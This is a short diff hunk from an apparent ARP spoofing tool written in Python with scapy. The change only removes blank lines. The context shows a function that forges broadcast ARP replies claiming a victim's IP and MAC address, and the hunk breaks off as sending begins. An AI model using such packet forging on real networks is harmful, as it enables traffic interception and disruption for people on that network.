@@ -5,8 +5,6 @@ console = Console()
 
 
 BROADCAST = "FF:FF:FF:FF:FF:FF"
-
-
 def main(victim_mac: str, victim_ip: str):
     pkt = Ether(src=victim_mac, dst=BROADCAST)/ARP(op=2, psrc=victim_ip)
     with console.status("Sending Packets..."):
